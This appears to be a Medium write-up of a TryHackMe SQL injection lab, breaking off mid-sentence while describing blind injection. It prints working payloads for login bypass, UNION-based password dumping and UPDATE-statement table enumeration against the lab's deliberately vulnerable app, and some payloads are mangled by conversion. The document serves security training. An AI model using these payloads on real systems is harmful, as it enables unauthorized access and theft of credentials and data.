---
title: "SQL Injection Lab Tryhackme Writeup 7e4d90562991"
platform: Medium
original_file: 2024-08-17_SQL-Injection-Lab-Tryhackme-Writeup-7e4d90562991.md
---

# SQL Injection Lab Tryhackme Writeup 7e4d90562991

::: {}
# SQL Injection Lab Tryhackme Writeup {#sql-injection-lab-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/sqlilab Note: This room is Free
:::

::::::: {.section .e-content field="body"}
:::::: {#9b1c .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### SQL Injection Lab Tryhackme Writeup {#5651 .graf .graf--h3 .graf--leading .graf--title name="5651"}

<figure id="13e9" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*KFVCx-My8RFFdddrFSUI9g.png"
class="graf-image" data-image-id="1*KFVCx-My8RFFdddrFSUI9g.png"
data-width="2240" data-height="1260" data-is-featured="true" />
</figure>

<figure id="0f7f" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*kGWyDdKAq74ohOOK.png"
class="graf-image" data-image-id="0*kGWyDdKAq74ohOOK.png"
data-width="509" data-height="289" />
</figure>

**Room link:**
[https://tryhackme.com/room/sqlilab](https://tryhackme.com/room/sqlilab){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/sqlilab"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

Before You go through this writeup First Complete This Room

### Task 2: Introduction to SQL Injection: Part 1 {#79c3 .graf .graf--h3 .graf-after--p name="79c3"}

SQL injection is a technique through which attackers can execute their
own malicious SQL statements generally referred to as a malicious
payload. Through the malicious SQL statements, attackers can steal
information from the victim's database; even worse, they may be able to
make changes to the database. Our employee management web application
has SQL injection vulnerabilities, which mimic the mistakes frequently
made by developers.

Applications will often need dynamic SQL queries to be able to display
content based on different conditions set by the user. To allow for
dynamic SQL queries, developers often concatenate user input directly
into the SQL statement. Without checks on the received input, string
concatenation becomes the most common mistake that leads to SQL
injection vulnerability. Without input sensitization, the user can make
the database interpret the user input as a SQL statement instead of as
data. In other words, the attacker must have access to a parameter that
they can control, which goes into the SQL statement. With control of a
parameter, the attacker can inject a malicious query, which will be
executed by the database. If the application does not sanitize the given
input from the attacker-controlled parameter, the query will be
vulnerable to SQL injection attack.

The following PHP code demonstrates a dynamic SQL query in a login from.
The user and password variables from the POST request is concatenated
directly into the SQL statement.

``` {#e7fa .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ruby"}
$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"
```

If the attacker supplies the value ' OR 1=1 --- --- inside the name
parameter, the query might return more than one user. Most applications
will process the first user returned, meaning that the attacker can
exploit this and log in as the first user the query returned. The
double-dash ( --- ) sequence is a comment indicator in SQL and causes
the rest of the query to be commented out. In SQL, a string is enclosed
within either a single quote (') or a double quote ("). The single quote
(') in the input is used to close the string literal. If the attacker
enters ' OR 1=1 --- --- in the name parameter and leaves the password
blank, the query above will result in the following SQL statement.

``` {#12e8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
```

If the database executes the SQL statement above, all the users in the
users table are returned. Consequently, the attacker bypasses the
application's authentication mechanism and is logged in as the first
user returned by the query.

The reason for using --- --- instead of --- is primarily because of how
MySQL handles the double-dash comment style.

From a --- sequence to the end of the line. In MySQL,
the --- (double-dash) comment style requires the second dash to be
followed by at least one whitespace or control character (such as a
space, tab, newline, and so on). This syntax differs slightly from
standard SQL comment syntax, as discussed in Section 1.7.2.4, "' --- '
as the Start of a Comment".
([**dev.mysql.com**](https://dev.mysql.com/doc/refman/8.0/en/comments.html){.markup--anchor
.markup--p-anchor
data-href="https://dev.mysql.com/doc/refman/8.0/en/comments.html"
rel="noopener ugc nofollow noopener" target="_blank"}**)**

The safest solution for inline SQL comment is to use --- \<space\>\<any
character\> such as --- --- because if it is URL-encoded into --- %20-
it will still be decoded as --- -. For more information, see:
[**https://blog.raw.pm/en/sql-injection-mysql-comment/**](https://blog.raw.pm/en/sql-injection-mysql-comment/){.markup--anchor
.markup--p-anchor
data-href="https://blog.raw.pm/en/sql-injection-mysql-comment/"
rel="noopener ugc nofollow noopener" target="_blank"}

SQL Injection 1: Input Box Non-String

When a user logs in, the application performs the following query:

``` {#c5df .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
```

When logging in, the user supplies input to the profileID parameter. For
this challenge, the parameter accepts an integer, as can be seen here:

``` {#b4b9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
profileID=10
```

Since there is no input sanitization, it is possible to bypass the login
by using any True condition such as the one below as the ProfileID

``` {#751e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="lua"}
1 or 1=1-- -
```

Bypass the login and retrieve the flag.

SQL Injection 2: Input Box String

This challenge uses the same query as in the previous challenge.
However, the parameter expects a string instead of an integer, as can be
seen here:

``` {#d57c .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
profileID='10'
```

Since it expects a string, we need to modify our payload to bypass the
login slightly. The following line will let us in:

``` {#afde .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
1' or '1'='1'-- -
```

Bypass the login and retrieve the flag.

SQL Injection 3 and 4: URL and POST Injection

Here, the SQL query is the same as the previous one:

``` {#3ad9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='10' AND password='ce5ca67...'
```

But in this case, the malicious user input cannot be injected directly
into the application via the login form because some client-side
controls have been implemented:

``` {#f6d2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
function validateform() {var profileID = document.inputForm.profileID.value;var password = document.inputForm.password.value;if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {alert("The input fields cannot contain special characters");return false;}if (profileID == null || password == null) {alert("The input fields cannot be empty.");return false;}}
```

The JavaScript code above requires that both the profileID and the
password only contains characters between a-z, A-Z, and 0--9.
Client-side controls are only there to improve the user experience and
is in no way a security feature as the user has full control over the
client and the data it submits. For example, a proxy tool such as Burp
Suite can be used to bypass the client side JavaScript validation
**(**[**https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation**](https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation){.markup--anchor
.markup--p-anchor
data-href="https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation"
rel="noopener ugc nofollow noopener" target="_blank"}**)**.

**Q.1**:What is the flag for SQL Injection 1: Input Box Non-String?

<figure id="4d41" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ECHFGye0R-d7GKoG.png"
class="graf-image" data-image-id="0*ECHFGye0R-d7GKoG.png"
data-width="440" data-height="393" />
</figure>

<figure id="de73" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*0Yni2acEqXGOblyN.png"
class="graf-image" data-image-id="0*0Yni2acEqXGOblyN.png"
data-width="875" data-height="264" />
</figure>

**Q.2**:What is the flag for SQL Injection 2: Input Box String?

<figure id="d1ce" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*61ojgkGoUpy15ZL6.png"
class="graf-image" data-image-id="0*61ojgkGoUpy15ZL6.png"
data-width="401" data-height="394" />
</figure>

<figure id="e3fc" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*hsG7ruzwj6NJdbD3.png"
class="graf-image" data-image-id="0*hsG7ruzwj6NJdbD3.png"
data-width="875" data-height="247" />
</figure>

**Q.3**:What is the flag for SQL Injection 3: URL Injection?

This challenge uses a GET request when submitting the login form, as
seen here:

<figure id="3da6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IVYr8Y7WpqUCFDWc.png"
class="graf-image" data-image-id="0*IVYr8Y7WpqUCFDWc.png"
data-width="806" data-height="506" />
</figure>

The login and the client-side validation can then easily be bypassed by
going directly to this URL:

``` {#9731 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://10.10.231.136:5000/sesqli3/login?profileID=a' or 1=1 --a' or 1=1 --&password=a
```

The browser will automatically urlencode this for us. Urlencoding is
needed since the HTTP protocol does not support all characters in the
request. When urlencoded, the URL looks as follows:

Convert your payload into urlencode using **HackBar 2 Extention**

<figure id="81a6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*pgmOMniC5qMRm5Wj.png"
class="graf-image" data-image-id="0*pgmOMniC5qMRm5Wj.png"
data-width="748" data-height="281" />
</figure>

<figure id="0db0" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/1*Ear2U-huYbxDVHCtNl-JAg.png"
class="graf-image" data-image-id="1*Ear2U-huYbxDVHCtNl-JAg.png"
data-width="728" data-height="223" />
</figure>

``` {#e78b .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}

a'%20or%201%3d1%20--10.10.231.136:5000/sesqli3/login?profileID=a'%20or%201%3d1%20--&password=a
```

The %27 becomes the single quote (') character and %20 becomes a blank
space.

<figure id="a344" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*RDFa3maELObpQ4C3.png"
class="graf-image" data-image-id="0*RDFa3maELObpQ4C3.png"
data-width="875" data-height="244" />
</figure>

**Q.4**:What is the flag for SQL Injection 4: POST Injection?

**SQL Injection 4: POST Injection** When submitting the login form for
this challenge, it uses the HTTP POST method. It is possible to either
remove/disable the JavaScript validating the login form or submit a
valid request and intercept it with a proxy tool such as Burp Suite and
modify it:

It means url will not show any parameter

that's why we use burpsuite to see parameter and change it

<figure id="148f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*FCyQ4SQxjqHBm3oN.png"
class="graf-image" data-image-id="0*FCyQ4SQxjqHBm3oN.png"
data-width="346" data-height="258" />
</figure>

Capture the request

<figure id="1900" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1dGlAXyFg-jiDDwu.png"
class="graf-image" data-image-id="0*1dGlAXyFg-jiDDwu.png"
data-width="464" data-height="380" />
</figure>

Change the profileID with **a' or 1=1 ---**

<figure id="8ef0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*pu3rwAQwoQpptZmE.png"
class="graf-image" data-image-id="0*pu3rwAQwoQpptZmE.png"
data-width="583" data-height="364" />
</figure>

and click on forward

<figure id="b39c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*RTZGV3Pwz9ORSdLL.png"
class="graf-image" data-image-id="0*RTZGV3Pwz9ORSdLL.png"
data-width="875" data-height="251" />
</figure>

### Task 3: Introduction to SQL Injection: Part 2 {#b49e .graf .graf--h3 .graf-after--figure name="b49e"}

Log in to the "SQL Injection 5: UPDATE Statement" challenge and exploit
the vulnerable profile page to find the flag. The credentials that can
be used are:

profileID: **10**

password: **toor**

The same enumeration demonstrated for finding tables and column names
must be done here since the flag is stored inside another table.

<figure id="7526" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2ngzVxTc4tgR-r95.png"
class="graf-image" data-image-id="0*2ngzVxTc4tgR-r95.png"
data-width="421" data-height="353" />
</figure>

<figure id="6edf" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Qkpj2JIzDSZOZAOG.png"
class="graf-image" data-image-id="0*Qkpj2JIzDSZOZAOG.png"
data-width="875" data-height="243" />
</figure>

### SQL Injection Attack on an UPDATE Statement {#9f9c .graf .graf--h3 .graf-after--figure name="9f9c"}

If a SQL injection occurs on an UPDATE statement, the damage can be much
more severe as it allows one to change records within the database. In
the employee management application, there is an edit profile page as
depicted in the following figure.

<figure id="ac52" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*tNXRDzcExYpC_cul.png"
class="graf-image" data-image-id="0*tNXRDzcExYpC_cul.png"
data-width="354" data-height="401" />
</figure>

This edit page allows the employees to update their information, but
they do not have access to all the available fields, and the user can
only change their information. If the form is vulnerable to SQL
injection, an attacker can bypass the implemented logic and update
fields they are not supposed to, or for other users.

We will now enumerate the database via the UPDATE statement on the
profile page. We will assume we have no prior knowledge of the database.
By looking at the web page's source code, we can identify potential
column names by looking at the name attribute. The columns don't
necessarily need to be named this, but there is a good chance of it, and
column names such as "email" and "password" are not uncommon and can
easily be guessed.

<figure id="b026" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qwZvePl4I1eUZq0_.png"
class="graf-image" data-image-id="0*qwZvePl4I1eUZq0_.png"
data-width="851" data-height="352" />
</figure>

To confirm that the form is vulnerable and that we have working column
names, we can try to inject something similar to the code below into the
nickName and email field:

``` {#2292 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
asd',nickName='test',email='hacked
```

When injecting the malicious payload into the nickName field, only the
nickName is updated. When injected into the email field, both fields are
updated:

<figure id="9a34" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*tCkJ6w18yQYyELRU.png"
class="graf-image" data-image-id="0*tCkJ6w18yQYyELRU.png"
data-width="423" data-height="467" />
</figure>

<figure id="fec1" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*lX8HMKa0sDy3JyM_.png"
class="graf-image" data-image-id="0*lX8HMKa0sDy3JyM_.png"
data-width="429" data-height="200" />
</figure>

The first test confirmed that the application is vulnerable and that we
have the correct column names. If we had the wrong column names, then
non of the fields would have been updated. Since both fields are updated
after injecting the malicious payload, the original SQL statement likely
looks something similar to the following code:

``` {#0b10 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>
```

With this knowledge, we can try to identify what database is in use.
There are a few ways to do this, but the easiest way is to ask the
database to identify itself. The following queries can be used to
identify MySQL, MSSQL, Oracle, and SQLite:

``` {#9ff1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="dart"}
# MySQL and MSSQL',nickName=@@version,email='# For Oracle',nickName=(SELECT banner FROM v$version),email='# For SQLite',nickName=sqlite_version(),email='
```

<figure id="e86b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*nth2NUfsjoB7VZQK.png"
class="graf-image" data-image-id="0*nth2NUfsjoB7VZQK.png"
data-width="401" data-height="473" />
</figure>

<figure id="30a6" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*fSCsTmR4woBMVoUb.png"
class="graf-image" data-image-id="0*fSCsTmR4woBMVoUb.png"
data-width="724" data-height="186" />
</figure>

Knowing what database we are dealing with makes it easier to understand
how to construct our malicious queries. We can proceed to enumerate the
database by extracting all the tables. In the code below, we perform a
subquery to fetch all the tables from database and place them into the
nickName field. The subquery is enclosed inside parantheses. The
[group_concat()](https://sqlite.org/lang_aggfunc.html#groupconcat){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_aggfunc.html#groupconcat"
rel="noopener ugc nofollow noopener" target="_blank"} function is used
to dump all the tables simultaneously.

> *"The* ****
> [***group_concat()***](https://sqlite.org/lang_aggfunc.html#groupconcat){.markup--anchor
> .markup--blockquote-anchor
> data-href="https://sqlite.org/lang_aggfunc.html#groupconcat"
> rel="noopener ugc nofollow noopener" target="_blank"} *function
> returns a string which is the concatenation of all non-NULL values of
> X. If parameter Y is present then it is used as the separator between
> instances of X. A comma (",") is used as the separator if Y is
> omitted. The order of the concatenated elements is arbitrary."*

``` {#d193 .graf .graf--pre .graf-after--blockquote .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="lua"}
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

<figure id="235a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*BGaEW5-8e1TEqVqb.png"
class="graf-image" data-image-id="0*BGaEW5-8e1TEqVqb.png"
data-width="409" data-height="457" />
</figure>

By injecting the code above, we can see that the only table in the
database is called "**usertable**" and "**secrets"**

<figure id="2dcb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uKlrX2zm6vnzDSIg.png"
class="graf-image" data-image-id="0*uKlrX2zm6vnzDSIg.png"
data-width="735" data-height="185" />
</figure>

We can then continue by extract all the column names from the
**usertable:**

``` {#5221 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
```

<figure id="9c18" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*HOnZN36MqTBLqyb8.png"
class="graf-image" data-image-id="0*HOnZN36MqTBLqyb8.png"
data-width="403" data-height="462" />
</figure>

And as can be seen below, the usertable contains the columns: UID, name,
profileID, salary, passportNr, email, nickName, and password:

<figure id="8c4f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*BIFSiG-dFIjn5uBZ.png"
class="graf-image" data-image-id="0*BIFSiG-dFIjn5uBZ.png"
data-width="875" data-height="165" />
</figure>

By knowing the names of the columns, we can extract the data we want
from the database. For example, the query below will extract profileID,
name, and passwords from secrets. The subquery is using the
[group_concat()](https://sqlite.org/lang_aggfunc.html#groupconcat){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_aggfunc.html#groupconcat"
rel="noopener ugc nofollow noopener" target="_blank"} function to dump
all the information simultaneously, and the
[\|\|](https://sqlite.org/lang_expr.html#operators){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_expr.html#operators"
rel="noopener ugc nofollow noopener" target="_blank"} operator is
"concatenate" --- it joins together the strings of its operands
**(**[**sqlite.org**](https://sqlite.org/lang_expr.html#operators){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_expr.html#operators"
rel="noopener ugc nofollow noopener" target="_blank"}**).**

``` {#d641 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
',nickName=(SELECT group_concat(id || "," || author|| "," || secret|| ":") from secrets),email='
```

Boom ! we got **flag**

### Task 4: Vulnerable Startup: Broken Authentication {#daf4 .graf .graf--h3 .graf-after--p name="daf4"}

From the landing page on
[http://10.10.110.236:5000,](http://10.10.110.236:5000,){.markup--anchor
.markup--p-anchor data-href="http://10.10.110.236:5000," rel="noopener"
target="_blank"} go to Broken Authentication under Track: Vulnerable
Startup
([http://10.10.110.236:5000/challenge1/](http://10.10.110.236:5000/challenge1/){.markup--anchor
.markup--p-anchor data-href="http://10.10.110.236:5000/challenge1/"
rel="noopener ugc nofollow noopener" target="_blank"}).

<figure id="f14c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*S5sf7PVPlJgUCggR.png"
class="graf-image" data-image-id="0*S5sf7PVPlJgUCggR.png"
data-width="343" data-height="316" />
</figure>

Bypass the login and retrieve the flag.

<figure id="051a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*u9OlCltYVsybhMet.png"
class="graf-image" data-image-id="0*u9OlCltYVsybhMet.png"
data-width="680" data-height="268" />
</figure>

### Task 5: Vulnerable Startup: Broken Authentication 2 {#232d .graf .graf--h3 .graf-after--figure name="232d"}

### Goal {#a851 .graf .graf--h3 .graf-after--h3 name="a851"}

This challenge builds upon the previous challenge. Here, the goal is to
find a way to dump all the passwords in the database to retrieve the
flag without using blind injection.

### Description {#d687 .graf .graf--h3 .graf-after--p name="d687"}

The login form is still vulnerable to SQL injection, and it is possible
to bypass the login by using **'** **OR 1=1 --- -**as a username.

Before dumping all the passwords, we need to identify places where
results from the login query is returned within the application. After
logging in, the name of the currently logged-on user is displayed in the
top right corner, so it might be possible to dump the data there, as
seen here:

<figure id="bde8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*QMNjnmGFj0h3HieT.png"
class="graf-image" data-image-id="0*QMNjnmGFj0h3HieT.png"
data-width="331" data-height="417" />
</figure>

<figure id="892a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*J-iJxYALoA6nXBy_.png"
class="graf-image" data-image-id="0*J-iJxYALoA6nXBy_.png"
data-width="875" data-height="180" />
</figure>

Data from the query could also be stored in the session cookie. It is
possible to extract the session cookie by opening developer tools in the
browser, which can be done by pressing F12. Then navigate to Storage and
copy the value of the session cookie, as seen here:

<figure id="b620" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*4mjelUJkRlGl90u9.png"
class="graf-image" data-image-id="0*4mjelUJkRlGl90u9.png"
data-width="875" data-height="448" />
</figure>

Then it is possible to decode the cookie at
[**https://www.kirsle.net/wizards/flask-session.cgi**](https://www.kirsle.net/wizards/flask-session.cgi){.markup--anchor
.markup--p-anchor
data-href="https://www.kirsle.net/wizards/flask-session.cgi"
rel="noopener ugc nofollow noopener" target="_blank"} or via a custom
script. A script to decode the cookie can be downloaded inside the VM by
going to
[**http://10.10.110.236:5000/download/decode_cookie.py**](http://10.10.110.236:5000/download/decode_cookie.py){.markup--anchor
.markup--p-anchor
data-href="http://10.10.110.236:5000/download/decode_cookie.py"
rel="noopener ugc nofollow noopener" target="_blank"}.

After having logged in with **' OR 1=1 --- -**as username, the decoded
cookie can be seen below, and it is clear that the user id and username
from the login query are placed inside it.

<figure id="6c70" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_j4VhrC6NKRB1Mrh.png"
class="graf-image" data-image-id="0*_j4VhrC6NKRB1Mrh.png"
data-width="536" data-height="389" />
</figure>

<figure id="e508" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*ABKWmct47tbNeMbr.png"
class="graf-image" data-image-id="0*ABKWmct47tbNeMbr.png"
data-width="604" data-height="584" />
</figure>

It is possible to dump the passwords by using a UNION based SQL
injection. There are two key requirements that must be met for a UNION
based injection to work:

- [The number of columns in the injected query must be the same as in
  the original query]{#0877}
- [The data types for each column must match the corresponding
  type]{#6224}

When logging in to the application, it executed the query below. From
the SQL statement, we can see that it is retrieving two columns; id and
username.

``` {#f423 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT id, username FROM users WHERE username = '" + username + "' AND password = '" + password + "'
```

Try this one by one

``` {#b09f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
1' UNION SELECT NULL-- -1' UNION SELECT NULL, NULL-- -1' UNION SELECT NULL, NULL, NULL-- -
```

<figure id="4ecd" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*ECFfgYEce0mM2GxF.png"
class="graf-image" data-image-id="0*ECFfgYEce0mM2GxF.png"
data-width="358" data-height="454" />
</figure>

<figure id="bf96" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*zA10WA_51SVX0k5L.png"
class="graf-image" data-image-id="0*zA10WA_51SVX0k5L.png"
data-width="391" data-height="529" />
</figure>

it says Query executed .In this case, successful means that the
application will successfully login when the correct number of columns
is injected. In other cases, if error messages are enabled, a warning
might be displayed saying "SELECTs to the left and right of UNION do not
have the same number of result columns" when incorrect number of columns
are injected.

By using **' UNION SELECT 1,2 --- -**as username, we match the number of
columns in the original SQL query, and the application lets us in. After
logging in, we can see that the username is replaced with the integer 2,
which is what we used as column two in the injected query.

<figure id="ca86" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*fjc22L00mC3JDrjk.png"
class="graf-image" data-image-id="0*fjc22L00mC3JDrjk.png"
data-width="352" data-height="402" />
</figure>

<figure id="fad9" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Au1wH0Gi_tilBbvU.png"
class="graf-image" data-image-id="0*Au1wH0Gi_tilBbvU.png"
data-width="817" data-height="160" />
</figure>

The same goes for the username in the session cookie. By decoding it, we
can see that the username has been replaced with the same value as above

<figure id="ce0f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SrTgV7FIxbldtwYD.png"
class="graf-image" data-image-id="0*SrTgV7FIxbldtwYD.png"
data-width="850" data-height="447" />
</figure>

<figure id="aacc" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Vrcji2iiA65meTE2.png"
class="graf-image" data-image-id="0*Vrcji2iiA65meTE2.png"
data-width="513" data-height="206" />
</figure>

Enumerate the database to find tables and columns, as we did under Task
2 Introduction to SQL Injection. A cheat sheet such as
[**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md){.markup--anchor
.markup--p-anchor
data-href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md"
rel="noopener ugc nofollow noopener" target="_blank"} can be helpful for
this. The challenge's objective was to dump all the passwords to get the
flag, so in this case, we will guess that the column name is *password*
and that the table name is *users*. With this logic, it is possible to
dump the passwords with the following code:

``` {#c446 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="vbnet"}
' UNION SELECT 1, password from users-- -
```

<figure id="7676" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*xeROFiD-YRvhCKY-.png"
class="graf-image" data-image-id="0*xeROFiD-YRvhCKY-.png"
data-width="341" data-height="422" />
</figure>

<figure id="92a8" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*AHCsWQVEKWuO2RjM.png"
class="graf-image" data-image-id="0*AHCsWQVEKWuO2RjM.png"
data-width="416" data-height="81" />
</figure>

However, the previous statement will only return one password. The
[group_concat()](https://sqlite.org/lang_aggfunc.html#groupconcat){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_aggfunc.html#groupconcat"
rel="noopener ugc nofollow noopener" target="_blank"} function can help
achieve the goal of dumping all the passwords simultaneously.

By injecting the following code into the username field:

``` {#5f1b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="vbnet"}
' UNION SELECT 1,group_concat(password) FROM users-- -
```

<figure id="cb0d" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*yzKRn4FPy4EIWF7y.png"
class="graf-image" data-image-id="0*yzKRn4FPy4EIWF7y.png"
data-width="832" data-height="168" />
</figure>

Boom ! we got **Flag**

### Task 6: Vulnerable Startup: Broken Authentication 3 (Blind Injection) {#e2fc .graf .graf--h3 .graf-after--p name="e2fc"}

### Goal {#ae0b .graf .graf--h3 .graf-after--h3 name="ae0b"}

This challenge has the same vulnerability as the previous one. However,
it is no longer possible to extract data from the Flask session cookie
or via the username display. The login form still has the same
vulnerability, but this time the goal is to abuse the login form with
blind SQL injection to extract the admin's password.

### Description {#a65d .graf .graf--h3 .graf-after--p name="a65d"}

Boolean-based blind SQL injection will be used to extract the password.
Blind injections are tedious and time-consuming to do manually, so the
plan is to build a script to extract the password character by
character. Before making a script to automate the injection, it is vital
to understand how the injection works. The idea is to send a SQL query
asking true or false questions for each character in the password. The
application's response will be analyzed to understand whether the
database returned true or false. In this case, the application will let
us in if the response is successful, or it will stay on the login page
saying, "Invalid username or password" in the case it returns false, as
seen in the image below.

<figure id="699a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*43jiHghJlUno9XhQ.png"
class="graf-image" data-image-id="0*43jiHghJlUno9XhQ.png"
data-width="875" data-height="413" />
</figure>

As previously stated, we will want to send boolean questions to the
database for each character in the password, asking the database whether
we have guessed the correct character or not. To achieve this, we will
need a way to control which character we are at and increment it every
time we have guessed the correct character at the current position.
SQLite's
[substr](https://sqlite.org/lang_corefunc.html#substr){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_corefunc.html#substr"
rel="noopener ugc nofollow noopener" target="_blank"} function can help
us achieve this functionality.

"The SQLite substr function returns a substring from a string starting
at a specified position with a predefined length." ([SQLite
Tutorial](https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/){.markup--anchor
.markup--p-anchor
data-href="https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/"
rel="noopener ugc nofollow noopener" target="_blank"})

The first argument to
[substr](https://sqlite.org/lang_corefunc.html#substr){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_corefunc.html#substr"
rel="noopener ugc nofollow noopener" target="_blank"} is the string
itself, which will be the admin's password. The second argument is the
